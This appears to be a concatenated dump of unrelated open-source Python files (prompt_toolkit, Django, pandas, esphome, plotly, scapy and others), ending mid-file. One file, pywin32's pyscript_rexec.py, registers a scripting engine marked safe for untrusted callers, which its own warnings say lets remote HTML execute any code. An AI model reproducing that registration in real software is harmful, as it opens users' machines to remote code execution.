HasValidationError = lambda: has_validation_error
HasArg = lambda: has_arg
IsDone = lambda: is_done
RendererHeightIsKnown = lambda: renderer_height_is_known
ViNavigationMode = lambda: vi_navigation_mode
InPasteMode = lambda: in_paste_mode
EmacsMode = lambda: emacs_mode
EmacsInsertMode = lambda: emacs_insert_mode
ViMode = lambda: vi_mode
IsSearching = lambda: is_searching
HasSearch = lambda: is_searching
ControlIsSearchable = lambda: control_is_searchable
EmacsSelectionMode = lambda: emacs_selection_mode
ViDigraphMode = lambda: vi_digraph_mode
ViWaitingForTextObjectMode = lambda: vi_waiting_for_text_object_mode
ViSelectionMode = lambda: vi_selection_mode
ViReplaceMode = lambda: vi_replace_mode
ViInsertMultipleMode = lambda: vi_insert_multiple_mode
ViInsertMode = lambda: vi_insert_mode
HasSelection = lambda: has_selection
HasCompletions = lambda: has_completions
IsReadOnly = lambda: is_read_only
IsMultiline = lambda: is_multiline

HasFocus = has_focus  # No lambda here! (Has_focus is callable that returns a callable.)
InEditingMode = in_editing_mode"
JY141	JY141-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'
TIME_FORMAT = 'P'                       # '2:30 p.m.'
DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'
YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'
MONTH_DAY_FORMAT = 'j F'                # '25 October'
SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'
SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'
FIRST_DAY_OF_WEEK = 0                   # Sunday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'
    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'
    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'
    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'
    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'
    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = ','
NUMBER_GROUPING = 3"
JY320	JY320-load_lyhm.py	"import eos
import numpy as np
from scipy.io import loadmat

# This script loads the Liverpool-York Head Model (LYHM, [1]) from one of their Matlab .mat files into the eos model
# format, and returns an eos.morphablemodel.MorphableModel.
#
# Note: The LYHM does not come with texture (uv-) coordinates. If you have texture coordinates for the model, they can
# be added to the eos.morphablemodel.MorphableModel(...) constructor as a parameter.
#
# [1]: Statistical Modeling of Craniofacial Shape and Texture,
#      H. Dai, N. E. Pears, W. Smith and C. Duncan,
#      International Journal of Computer Vision (2019).
#      https://www-users.cs.york.ac.uk/~nep/research/LYHM/


def load_lyhm(matlab_model_path):
    lyhm = loadmat(matlab_model_path)
    triangle_list = lyhm['tri']['faces'][0][0] - 1  # Convert from 1-based Matlab indexing to 0-based C++ indexing
    # The LYHM has front-facing triangles defined the wrong way round (not in accordance with OpenGL) - we swap the indices:
    for t in triangle_list:
        t[1], t[2] = t[2], t[1]

    # The LYHM .mat files contain the orthonormal basis vectors, so we don't need to convert anything:
    shape_mean = lyhm['shp']['mu'][0][0][0]
    shape_orthonormal_pca_basis = lyhm['shp']['eigVec'][0][0]
    shape_pca_eigenvalues = lyhm['shp']['eigVal'][0][0]

    # The color values are in [0, 1]
    color_mean = lyhm['tex']['mu'][0][0][0]
    color_orthonormal_pca_basis = lyhm['tex']['eigVec'][0][0]
    color_pca_eigenvalues = lyhm['tex']['eigVal'][0][0]

    # Construct and return the LYHM as eos MorphableModel:
    shape_model = eos.morphablemodel.PcaModel(shape_mean, shape_orthonormal_pca_basis, shape_pca_eigenvalues, triangle_list)
    color_model = eos.morphablemodel.PcaModel(color_mean, color_orthonormal_pca_basis, color_pca_eigenvalues, triangle_list)
    model = eos.morphablemodel.MorphableModel(shape_model, color_model)

    return model"
JY147	JY147-_adapters.py	"import re
import textwrap
import email.message

from ._text import FoldedCase


class Message(email.message.Message):
    multiple_use_keys = set(
        map(
            FoldedCase,
            [
                'Classifier',
                'Obsoletes-Dist',
                'Platform',
                'Project-URL',
                'Provides-Dist',
                'Provides-Extra',
                'Requires-Dist',
                'Requires-External',
                'Supported-Platform',
                'Dynamic',
            ],
        )
    )
    """"""
    Keys that may be indicated multiple times per PEP 566.
    """"""

    def __new__(cls, orig: email.message.Message):
        res = super().__new__(cls)
        vars(res).update(vars(orig))
        return res

    def __init__(self, *args, **kwargs):
        self._headers = self._repair_headers()

    # suppress spurious error from mypy
    def __iter__(self):
        return super().__iter__()

    def _repair_headers(self):
        def redent(value):
            ""Correct for RFC822 indentation""
            if not value or '\n' not in value:
                return value
            return textwrap.dedent(' ' * 8 + value)

        headers = [(key, redent(value)) for key, value in vars(self)['_headers']]
        if self._payload:
            headers.append(('Description', self.get_payload()))
        return headers

    @property
    def json(self):
        """"""
        Convert PackageMetadata to a JSON-compatible format
        per PEP 0566.
        """"""

        def transform(key):
            value = self.get_all(key) if key in self.multiple_use_keys else self[key]
            if key == 'Keywords':
                value = re.split(r'\s+', value)
            tk = key.lower().replace('-', '_')
            return tk, value

        return dict(map(transform, map(FoldedCase, self)))"
JY353	JY353-compass.py	"""""""
    Defines compass observations.
""""""
import jinja2
import numpy as np

from minerl.herobraine.hero import spaces
# Copyright (c) 2020 All Rights Reserved
# Author: William H. Guss, Brandon Houghton

from minerl.herobraine.hero.handlers.translation import KeymapTranslationHandler, TranslationHandlerGroup

__all__ = ['CompassObservation']


class CompassObservation(TranslationHandlerGroup):
    def to_string(self) -> str:
        return ""compass""

    def xml_template(self) -> str:
        return str(
            """"""<ObservationFromCompass/>""""""
        )

    def __init__(self, angle=True, distance=False):
        """"""Initializes a compass observation. Forms

        Args:
            angle (bool, optional): Whether or not to include angle observation. Defaults to True.
            distance (bool, optional): Whether or not ot include distance observation. Defaults to False.
        """"""
        assert angle or distance, ""Must observe either angle or distance""

        handlers = []

        if angle:
            handlers.append(
                _CompassAngleObservation()
            )
        if distance:
            handlers.append(
                KeymapTranslationHandler(
                    hero_keys=[""distanceToCompassTarget""],
                    univ_keys=['compass', 'distance'],
                    to_string=""distance"",
                    space=spaces.Box(low=0, high=np.inf, shape=(), dtype=np.float32))
            )

        super(CompassObservation, self).__init__(handlers=handlers)


class _CompassAngleObservation(KeymapTranslationHandler):
    """"""
    Handles compass angle observations (converting to the correct angle offset normalized.)
    """"""

    def __init__(self):
        super().__init__(
            hero_keys=[""compassAngle""],
            univ_keys=['compass', ""angle""],
            space=spaces.Box(low=-180.0, high=180.0, shape=(), dtype=np.float32),
            to_string=""angle""
        )

    def from_universal(self, obs):
        y = np.array(((super().from_universal(obs) * 360.0 + 180) % 360.0) - 180)
        return y"
JY392	JY392-compiled.py	"from six import string_types

from .base import GraphQLDocument

# Necessary for static type checking
if False:  # flake8: noqa
    from ..type.schema import GraphQLSchema
    from typing import Any, Optional, Dict, Callable, Union


class GraphQLCompiledDocument(GraphQLDocument):
    @classmethod
    def from_code(
        cls,
        schema,  # type: GraphQLSchema
        code,  # type: Union[str, Any]
        uptodate=None,  # type: Optional[bool]
        extra_namespace=None,  # type: Optional[Dict[str, Any]]
    ):
        # type: (...) -> GraphQLCompiledDocument
        """"""Creates a GraphQLDocument object from compiled code and the globals.  This
        is used by the loaders and schema to create a document object.
        """"""
        if isinstance(code, string_types):
            filename = ""<document>""
            code = compile(code, filename, ""exec"")
        namespace = {""__file__"": code.co_filename}
        exec(code, namespace)
        if extra_namespace:
            namespace.update(extra_namespace)
        rv = cls._from_namespace(schema, namespace)
        # rv._uptodate = uptodate
        return rv

    @classmethod
    def from_module_dict(cls, schema, module_dict):
        # type: (GraphQLSchema, Dict[str, Any]) -> GraphQLCompiledDocument
        """"""Creates a template object from a module.  This is used by the
        module loader to create a document object.
        """"""
        return cls._from_namespace(schema, module_dict)

    @classmethod
    def _from_namespace(cls, schema, namespace):
        # type: (GraphQLSchema, Dict[str, Any]) -> GraphQLCompiledDocument
        document_string = namespace.get(""document_string"", """")  # type: str
        document_ast = namespace.get(""document_ast"")  # type: ignore
        execute = namespace[""execute""]  # type: Callable

        namespace[""schema""] = schema
        return cls(
            schema=schema,
            document_string=document_string,
            document_ast=document_ast,  # type: ignore
            execute=execute,
        )"
JY497	JY497-stepper.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import stepper
from esphome.const import (
    CONF_ID,
    CONF_PIN_A,
    CONF_PIN_B,
    CONF_PIN_C,
    CONF_PIN_D,
    CONF_SLEEP_WHEN_DONE,
    CONF_STEP_MODE,
)

uln2003_ns = cg.esphome_ns.namespace(""uln2003"")
ULN2003StepMode = uln2003_ns.enum(""ULN2003StepMode"")

STEP_MODES = {
    ""FULL_STEP"": ULN2003StepMode.ULN2003_STEP_MODE_FULL_STEP,
    ""HALF_STEP"": ULN2003StepMode.ULN2003_STEP_MODE_HALF_STEP,
    ""WAVE_DRIVE"": ULN2003StepMode.ULN2003_STEP_MODE_WAVE_DRIVE,
}

ULN2003 = uln2003_ns.class_(""ULN2003"", stepper.Stepper, cg.Component)

CONFIG_SCHEMA = stepper.STEPPER_SCHEMA.extend(
    {
        cv.Required(CONF_ID): cv.declare_id(ULN2003),
        cv.Required(CONF_PIN_A): pins.gpio_output_pin_schema,
        cv.Required(CONF_PIN_B): pins.gpio_output_pin_schema,
        cv.Required(CONF_PIN_C): pins.gpio_output_pin_schema,
        cv.Required(CONF_PIN_D): pins.gpio_output_pin_schema,
        cv.Optional(CONF_SLEEP_WHEN_DONE, default=False): cv.boolean,
        cv.Optional(CONF_STEP_MODE, default=""FULL_STEP""): cv.enum(
            STEP_MODES, upper=True, space=""_""
        ),
    }
).extend(cv.COMPONENT_SCHEMA)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)
    await stepper.register_stepper(var, config)

    pin_a = await cg.gpio_pin_expression(config[CONF_PIN_A])
    cg.add(var.set_pin_a(pin_a))
    pin_b = await cg.gpio_pin_expression(config[CONF_PIN_B])
    cg.add(var.set_pin_b(pin_b))
    pin_c = await cg.gpio_pin_expression(config[CONF_PIN_C])
    cg.add(var.set_pin_c(pin_c))
    pin_d = await cg.gpio_pin_expression(config[CONF_PIN_D])
    cg.add(var.set_pin_d(pin_d))

    cg.add(var.set_sleep_when_done(config[CONF_SLEEP_WHEN_DONE]))
    cg.add(var.set_step_mode(config[CONF_STEP_MODE]))"
JY486	JY486-loader.py	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            'select_template() takes an iterable of template names but got a '
            'string: %r. Use get_template() if you want to load a single '
            'template by name.' % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist(', '.join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
JY121	JY121-pyscript_rexec.py	"# A version of the ActiveScripting engine that enables rexec support
# This version supports hosting by IE - however, due to Python's
# rexec module being neither completely trusted nor private, it is
# *not* enabled by default.
# As of Python 2.2, rexec is simply not available - thus, if you use this,
# a HTML page can do almost *anything* at all on your machine.

# You almost certainly do NOT want to use thus!

import pythoncom
from win32com.axscript import axscript
import winerror
from . import pyscript

INTERFACE_USES_DISPEX = 0x00000004  # Object knows to use IDispatchEx
INTERFACE_USES_SECURITY_MANAGER = (
    0x00000008  # Object knows to use IInternetHostSecurityManager
)


class PyScriptRExec(pyscript.PyScript):
    # Setup the auto-registration stuff...
    _reg_verprogid_ = ""Python.AXScript-rexec.2""
    _reg_progid_ = ""Python""  # Same ProgID as the standard engine.
    # 	_reg_policy_spec_ = default
    _reg_catids_ = [axscript.CATID_ActiveScript, axscript.CATID_ActiveScriptParse]
    _reg_desc_ = ""Python ActiveX Scripting Engine (with rexec support)""
    _reg_clsid_ = ""{69c2454b-efa2-455b-988c-c3651c4a2f69}""
    _reg_class_spec_ = ""win32com.axscript.client.pyscript_rexec.PyScriptRExec""
    _reg_remove_keys_ = [("".pys"",), (""pysFile"",)]
    _reg_threading_ = ""Apartment""

    def _GetSupportedInterfaceSafetyOptions(self):
        # print ""**** calling"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions, ""**->"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions(self)
        return (
            INTERFACE_USES_DISPEX
            | INTERFACE_USES_SECURITY_MANAGER
            | axscript.INTERFACESAFE_FOR_UNTRUSTED_DATA
            | axscript.INTERFACESAFE_FOR_UNTRUSTED_CALLER
        )


if __name__ == ""__main__"":
    print(""WARNING: By registering this engine, you are giving remote HTML code"")
    print(""the ability to execute *any* code on your system."")
    print()
    print(""You almost certainly do NOT want to do this."")
    print(""You have been warned, and are doing this at your own (significant) risk"")
    pyscript.Register(PyScriptRExec)"
JD243	JD243-util.py	"from __future__ import annotations

import numpy as np

from pandas._typing import NumpyIndexT

from pandas.core.dtypes.common import is_list_like


def cartesian_product(X) -> list[np.ndarray]:
    """"""
    Numpy version of itertools.product.
    Sometimes faster (for large inputs)...

    Parameters
    ----------
    X : list-like of list-likes

    Returns
    -------
    product : list of ndarrays

    Examples
    --------
    >>> cartesian_product([list('ABC'), [1, 2]])
    [array(['A', 'A', 'B', 'B', 'C', 'C'], dtype='<U1'), array([1, 2, 1, 2, 1, 2])]

    See Also
    --------
    itertools.product : Cartesian product of input iterables.  Equivalent to
        nested for-loops.
    """"""
    msg = ""Input must be a list-like of list-likes""
    if not is_list_like(X):
        raise TypeError(msg)
    for x in X:
        if not is_list_like(x):
            raise TypeError(msg)

    if len(X) == 0:
        return []

    lenX = np.fromiter((len(x) for x in X), dtype=np.intp)
    cumprodX = np.cumproduct(lenX)

    if np.any(cumprodX < 0):
        raise ValueError(""Product space too large to allocate arrays!"")

    a = np.roll(cumprodX, 1)
    a[0] = 1

    if cumprodX[-1] != 0:
        b = cumprodX[-1] / cumprodX
    else:
        # if any factor is empty, the cartesian product is empty
        b = np.zeros_like(cumprodX)

    # error: Argument of type ""int_"" cannot be assigned to parameter ""num"" of
    # type ""int"" in function ""tile_compat""
    return [
        tile_compat(
            np.repeat(x, b[i]),
            np.product(a[i]),  # pyright: ignore[reportGeneralTypeIssues]
        )
        for i, x in enumerate(X)
    ]


def tile_compat(arr: NumpyIndexT, num: int) -> NumpyIndexT:
    """"""
    Index compat for np.tile.

    Notes
    -----
    Does not support multi-dimensional `num`.
    """"""
    if isinstance(arr, np.ndarray):
        return np.tile(arr, num)

    # Otherwise we have an Index
    taker = np.tile(np.arange(len(arr)), num)
    return arr.take(taker)"
JD54	JD54-compat.py	"""""""Stuff that differs in different Python versions and platform
distributions.""""""

import logging
import os
import sys

__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]


logger = logging.getLogger(__name__)


def has_tls() -> bool:
    try:
        import _ssl  # noqa: F401  # ignore unused

        return True
    except ImportError:
        pass

    from pip._vendor.urllib3.util import IS_PYOPENSSL

    return IS_PYOPENSSL


def get_path_uid(path: str) -> int:
    """"""
    Return path's uid.

    Does not follow symlinks:
        https://github.com/pypa/pip/pull/935#discussion_r5307003

    Placed this function in compat due to differences on AIX and
    Jython, that should eventually go away.

    :raises OSError: When path is a symlink or can't be read.
    """"""
    if hasattr(os, ""O_NOFOLLOW""):
        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
        file_uid = os.fstat(fd).st_uid
        os.close(fd)
    else:  # AIX and Jython
        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW
        if not os.path.islink(path):
            # older versions of Jython don't have `os.fstat`
            file_uid = os.stat(path).st_uid
        else:
            # raise OSError for parity with os.O_NOFOLLOW above
            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")
    return file_uid


# packages in the stdlib that may have installation metadata, but should not be
# considered 'installed'.  this theoretically could be determined based on
# dist.location (py27:`sysconfig.get_paths()['stdlib']`,
# py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may
# make this ineffective, so hard-coding
stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}


# windows detection, covers cpython and ironpython
WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
JY511	JY511-output.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import output
from esphome.const import CONF_ID, CONF_MIN_POWER, CONF_METHOD

CODEOWNERS = [""@glmnet""]

ac_dimmer_ns = cg.esphome_ns.namespace(""ac_dimmer"")
AcDimmer = ac_dimmer_ns.class_(""AcDimmer"", output.FloatOutput, cg.Component)

DimMethod = ac_dimmer_ns.enum(""DimMethod"")
DIM_METHODS = {
    ""LEADING_PULSE"": DimMethod.DIM_METHOD_LEADING_PULSE,
    ""LEADING"": DimMethod.DIM_METHOD_LEADING,
    ""TRAILING"": DimMethod.DIM_METHOD_TRAILING,
}

CONF_GATE_PIN = ""gate_pin""
CONF_ZERO_CROSS_PIN = ""zero_cross_pin""
CONF_INIT_WITH_HALF_CYCLE = ""init_with_half_cycle""
CONFIG_SCHEMA = cv.All(
    output.FLOAT_OUTPUT_SCHEMA.extend(
        {
            cv.Required(CONF_ID): cv.declare_id(AcDimmer),
            cv.Required(CONF_GATE_PIN): pins.internal_gpio_output_pin_schema,
            cv.Required(CONF_ZERO_CROSS_PIN): pins.internal_gpio_input_pin_schema,
            cv.Optional(CONF_INIT_WITH_HALF_CYCLE, default=True): cv.boolean,
            cv.Optional(CONF_METHOD, default=""leading pulse""): cv.enum(
                DIM_METHODS, upper=True, space=""_""
            ),
        }
    ).extend(cv.COMPONENT_SCHEMA),
    cv.only_with_arduino,
)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)

    # override default min power to 10%
    if CONF_MIN_POWER not in config:
        config[CONF_MIN_POWER] = 0.1
    await output.register_output(var, config)

    pin = await cg.gpio_pin_expression(config[CONF_GATE_PIN])
    cg.add(var.set_gate_pin(pin))
    pin = await cg.gpio_pin_expression(config[CONF_ZERO_CROSS_PIN])
    cg.add(var.set_zero_cross_pin(pin))
    cg.add(var.set_init_with_half_cycle(config[CONF_INIT_WITH_HALF_CYCLE]))
    cg.add(var.set_method(config[CONF_METHOD]))"
JD239	JD239-test_common.py	"import numpy as np
import pytest

from pandas.core.dtypes import dtypes
from pandas.core.dtypes.common import is_extension_array_dtype

import pandas as pd
import pandas._testing as tm
from pandas.core.arrays import ExtensionArray


class DummyDtype(dtypes.ExtensionDtype):
    pass


class DummyArray(ExtensionArray):
    def __init__(self, data) -> None:
        self.data = data

    def __array__(self, dtype):
        return self.data

    @property
    def dtype(self):
        return DummyDtype()

    def astype(self, dtype, copy=True):
        # we don't support anything but a single dtype
        if isinstance(dtype, DummyDtype):
            if copy:
                return type(self)(self.data)
            return self

        return np.array(self, dtype=dtype, copy=copy)


class TestExtensionArrayDtype:
    @pytest.mark.parametrize(
        ""values"",
        [
            pd.Categorical([]),
            pd.Categorical([]).dtype,
            pd.Series(pd.Categorical([])),
            DummyDtype(),
            DummyArray(np.array([1, 2])),
        ],
    )
    def test_is_extension_array_dtype(self, values):
        assert is_extension_array_dtype(values)

    @pytest.mark.parametrize(""values"", [np.array([]), pd.Series(np.array([]))])
    def test_is_not_extension_array_dtype(self, values):
        assert not is_extension_array_dtype(values)


def test_astype():

    arr = DummyArray(np.array([1, 2, 3]))
    expected = np.array([1, 2, 3], dtype=object)

    result = arr.astype(object)
    tm.assert_numpy_array_equal(result, expected)

    result = arr.astype(""object"")
    tm.assert_numpy_array_equal(result, expected)


def test_astype_no_copy():
    arr = DummyArray(np.array([1, 2, 3], dtype=np.int64))
    result = arr.astype(arr.dtype, copy=False)

    assert arr is result

    result = arr.astype(arr.dtype)
    assert arr is not result


@pytest.mark.parametrize(""dtype"", [dtypes.CategoricalDtype(), dtypes.IntervalDtype()])
def test_is_extension_array_dtype(dtype):
    assert isinstance(dtype, dtypes.ExtensionDtype)
    assert is_extension_array_dtype(dtype)"
JY400	JY400-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""funnelarea.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY47	JY47-TESTS.py	"#!../env.py
#
# SPDX-License-Identifier: BSD-3-Clause
# Copyright 2020, Intel Corporation

import testframework as t
from testframework import granularity as g
import futils
import os


# All test cases in pmem2_persist_valgrind use Valgrind, which is not available
# on Windows systems.
@t.windows_exclude
@t.require_valgrind_enabled('pmemcheck')
# XXX In the match file, there are two possible numbers of errors. It varies
# from compiler to compiler. There should be only one number when pmemcheck
# will be fixed. Please also remove the below requirement after pmemcheck fix.
# https://github.com/pmem/valgrind/pull/76
@g.require_granularity(g.CL_OR_LESS)
class PMEM2_PERSIST(t.Test):
    test_type = t.Medium
    available_granularity = None

    def run(self, ctx):
        filepath = ctx.create_holey_file(2 * t.MiB, 'testfile')
        ctx.exec('pmem2_persist_valgrind', self.test_case, filepath)


class TEST0(PMEM2_PERSIST):
    """"""persist continuous data in a range of pmem""""""
    test_case = ""test_persist_continuous_range""


class TEST1(PMEM2_PERSIST):
    """"""persist discontinuous data in a range of pmem""""""
    test_case = ""test_persist_discontinuous_range""


class TEST2(PMEM2_PERSIST):
    """"""persist part of discontinuous data in a range of pmem""""""
    test_case = ""test_persist_discontinuous_range_partially""

    def run(self, ctx):
        filepath = ctx.create_holey_file(16 * t.KiB, 'testfile')
        ctx.exec('pmem2_persist_valgrind', self.test_case, filepath)
        pmemecheck_log = os.path.join(
            os.getcwd(), 'pmem2_persist_valgrind', 'pmemcheck2.log')
        futils.tail(pmemecheck_log, 2)


class TEST3(PMEM2_PERSIST):
    """"""persist data in a range of the memory mapped by mmap()""""""
    test_case = ""test_persist_nonpmem_data"""
JD271	JD271-middleware.py	"from django.apps import apps
from django.conf import settings
from django.contrib.redirects.models import Redirect
from django.contrib.sites.shortcuts import get_current_site
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpResponseGone, HttpResponsePermanentRedirect
from django.utils.deprecation import MiddlewareMixin


class RedirectFallbackMiddleware(MiddlewareMixin):
    # Defined as class-level attributes to be subclassing-friendly.
    response_gone_class = HttpResponseGone
    response_redirect_class = HttpResponsePermanentRedirect

    def __init__(self, get_response):
        if not apps.is_installed(""django.contrib.sites""):
            raise ImproperlyConfigured(
                ""You cannot use RedirectFallbackMiddleware when ""
                ""django.contrib.sites is not installed.""
            )
        super().__init__(get_response)

    def process_response(self, request, response):
        # No need to check for a redirect for non-404 responses.
        if response.status_code != 404:
            return response

        full_path = request.get_full_path()
        current_site = get_current_site(request)

        r = None
        try:
            r = Redirect.objects.get(site=current_site, old_path=full_path)
        except Redirect.DoesNotExist:
            pass
        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):
            try:
                r = Redirect.objects.get(
                    site=current_site,
                    old_path=request.get_full_path(force_append_slash=True),
                )
            except Redirect.DoesNotExist:
                pass
        if r is not None:
            if r.new_path == """":
                return self.response_gone_class()
            return self.response_redirect_class(r.new_path)

        # No redirect was found. Return the response.
        return response"
JY461	JY461-test_join.py	"import numpy as np
import pytest

from pandas._libs.tslibs import IncompatibleFrequency

from pandas import (
    Index,
    PeriodIndex,
    period_range,
)
import pandas._testing as tm


class TestJoin:
    def test_join_outer_indexer(self):
        pi = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        result = pi._outer_indexer(pi)
        tm.assert_extension_array_equal(result[0], pi._values)
        tm.assert_numpy_array_equal(result[1], np.arange(len(pi), dtype=np.intp))
        tm.assert_numpy_array_equal(result[2], np.arange(len(pi), dtype=np.intp))

    def test_joins(self, join_type):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        joined = index.join(index[:-5], how=join_type)

        assert isinstance(joined, PeriodIndex)
        assert joined.freq == index.freq

    def test_join_self(self, join_type):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")

        res = index.join(index, how=join_type)
        assert index is res

    def test_join_does_not_recur(self):
        df = tm.makeCustomDataframe(
            3,
            2,
            data_gen_f=lambda *args: np.random.randint(2),
            c_idx_type=""p"",
            r_idx_type=""dt"",
        )
        ser = df.iloc[:2, 0]

        res = ser.index.join(df.columns, how=""outer"")
        expected = Index(
            [ser.index[0], ser.index[1], df.columns[0], df.columns[1]], object
        )
        tm.assert_index_equal(res, expected)

    def test_join_mismatched_freq_raises(self):
        index = period_range(""1/1/2000"", ""1/20/2000"", freq=""D"")
        index3 = period_range(""1/1/2000"", ""1/20/2000"", freq=""2D"")
        msg = r"".*Input has different freq=2D from Period\(freq=D\)""
        with pytest.raises(IncompatibleFrequency, match=msg):
            index.join(index3)"
JY116	JY116-rtp.py	"# This file is part of Scapy
# See http://www.secdev.org/projects/scapy for more information
# Copyright (C) Philippe Biondi <phil@secdev.org>
# This program is published under a GPLv2 license

""""""
RTP (Real-time Transport Protocol).

Remember to use::

    bind_layers(UDP, RTP, dport=XXX)

To register the port you are using
""""""

from scapy.packet import Packet, bind_layers
from scapy.fields import BitEnumField, BitField, BitFieldLenField, \
    FieldLenField, FieldListField, IntField, ShortField

_rtp_payload_types = {
    # http://www.iana.org/assignments/rtp-parameters
    0: 'G.711 PCMU', 3: 'GSM',
    4: 'G723', 5: 'DVI4',
    6: 'DVI4', 7: 'LPC',
    8: 'PCMA', 9: 'G722',
    10: 'L16', 11: 'L16',
    12: 'QCELP', 13: 'CN',
    14: 'MPA', 15: 'G728',
    16: 'DVI4', 17: 'DVI4',
    18: 'G729', 25: 'CelB',
    26: 'JPEG', 28: 'nv',
    31: 'H261', 32: 'MPV',
    33: 'MP2T', 34: 'H263'}


class RTPExtension(Packet):
    name = ""RTP extension""
    fields_desc = [ShortField(""header_id"", 0),
                   FieldLenField(""header_len"", None, count_of=""header"", fmt=""H""),  # noqa: E501
                   FieldListField('header', [], IntField(""hdr"", 0), count_from=lambda pkt: pkt.header_len)]  # noqa: E501


class RTP(Packet):
    name = ""RTP""
    fields_desc = [BitField('version', 2, 2),
                   BitField('padding', 0, 1),
                   BitField('extension', 0, 1),
                   BitFieldLenField('numsync', None, 4, count_of='sync'),
                   BitField('marker', 0, 1),
                   BitEnumField('payload_type', 0, 7, _rtp_payload_types),
                   ShortField('sequence', 0),
                   IntField('timestamp', 0),
                   IntField('sourcesync', 0),
                   FieldListField('sync', [], IntField(""id"", 0), count_from=lambda pkt:pkt.numsync)]  # noqa: E501


bind_layers(RTP, RTPExtension, extension=1)"
JY132	JY132-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = r'Y. \g\a\d\a j. F'
TIME_FORMAT = 'H:i'
